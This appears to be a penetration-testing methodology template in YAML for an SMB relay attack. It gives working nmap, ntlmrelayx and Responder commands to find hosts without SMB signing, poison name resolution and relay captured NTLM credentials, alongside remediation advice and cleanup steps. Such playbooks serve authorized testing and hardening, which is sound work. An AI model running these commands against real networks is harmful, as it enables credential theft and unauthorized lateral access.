# SMB Relay Attack Methodology
id: smb_relay_attack
version: "1.0.0"
template_version: "2.0"
name: "SMB Relay Attack"
workstream: "exploitation"
author: "Security Team"
created: "2024-01-01T00:00:00Z"
modified: "2024-09-29T00:00:00Z"
status: "active"
description: "Perform SMB relay attacks to gain unauthorized access to systems"
tags: ["smb", "relay", "ntlm", "exploitation", "lateral-movement"]
risk_level: "high"

overview:
  purpose: "Exploit SMB signing weaknesses and NTLM authentication to relay credentials"
  scope: "Internal networks with SMB services and weak authentication controls"
  prerequisites:
    - "Network access to target SMB services"
    - "Impacket toolkit installed"
    - "Network position for man-in-the-middle attacks"
    - "Authorization for exploitation testing"
  category: "exploitation"

triggers:
  - name: "SMB Service Without Signing"
    type: "vulnerability_discovered"
    conditions:
      asset_type: "host"
      properties:
        services:
          - port: 445
            protocol: "tcp"
            smb_signing_required: false

  - name: "NTLM Authentication Available"
    type: "service_discovered"
    conditions:
      asset_type: "host"
      properties:
        authentication_methods: ["ntlm"]

equipment:
  - "Impacket toolkit (ntlmrelayx.py)"
  - "Responder.py for network poisoning"
  - "Network access to target environment"
  - "Administrative workstation for execution"

procedures:
  - id: "proc_smb_signing_check"
    name: "Check SMB Signing Requirements"
    description: "Verify which hosts have SMB signing disabled"
    commands:
      - "nmap --script smb-security-mode.nse -p 445 {target_hosts}"
    placeholders:
      target_hosts: "asset.ip_addresses"
    expected_output:
      - "Message signing enabled but not required"
      - "SMB security mode information"

  - id: "proc_setup_ntlm_relay"
    name: "Setup NTLM Relay Attack"
    description: "Configure ntlmrelayx to capture and relay NTLM authentication"
    commands:
      - "python3 ntlmrelayx.py -tf {target_file} -smb2support -socks"
    placeholders:
      target_file: "/tmp/relay_targets.txt"
    expected_output:
      - "NTLM relay server started"
      - "Waiting for connections"

  - id: "proc_trigger_authentication"
    name: "Trigger NTLM Authentication"
    description: "Use Responder or other methods to trigger NTLM authentication"
    commands:
      - "python3 Responder.py -I {interface} -A"
    placeholders:
      interface: "network.interface"
    expected_output:
      - "NTLM authentication captured"
      - "Relay attempt initiated"

findings:
  - id: "finding_smb_relay_success"
    title: "SMB Relay Attack Successful"
    severity: "critical"
    description: "Successfully relayed NTLM credentials to gain unauthorized access"
    remediation: "Enable SMB signing on all systems and implement network segmentation"

  - id: "finding_weak_smb_config"
    title: "Weak SMB Configuration Detected"
    severity: "high"
    description: "SMB signing not required, enabling relay attacks"
    remediation: "Configure 'Microsoft network server: Digitally sign communications (always)' policy"

cleanup:
  - id: "cleanup_relay_artifacts"
    description: "Clean up relay attack artifacts and temporary files"
    required: true
    commands:
      - "rm -f /tmp/relay_targets.txt"
      - "pkill -f ntlmrelayx"
      - "pkill -f Responder"

troubleshooting:
  - issue: "Relay attack fails immediately"
    solution: "Check if SMB signing is enforced on target systems"

  - issue: "No NTLM authentication captured"
    solution: "Verify network position and ensure Responder is configured correctly"

  - issue: "Relay succeeds but no shell access"
    solution: "Check if relayed user has administrative privileges on target"